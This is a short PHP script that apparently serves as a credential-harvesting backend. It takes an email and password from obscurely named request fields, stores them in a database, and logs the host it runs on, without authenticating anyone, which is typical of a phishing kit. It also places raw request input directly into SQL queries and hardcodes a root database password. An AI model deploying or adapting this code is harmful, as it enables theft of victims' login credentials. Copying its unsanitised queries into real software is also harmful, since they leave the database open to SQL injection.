<?php
$con = mysql_connect('localhost','root','cr4ckmyp4ss') 
       or die('Cannot connect to the DB');
mysql_select_db('ucm',$con);
$email=$_REQUEST['one'];
$pass=$_REQUEST['one_one'];
$loc=$_SERVER['HTTP_HOST'];
$result=mysql_query("INSERT into summa values('$email' , '$pass');");
$result=mysql_query("INSERT into server values('$loc');");
?>
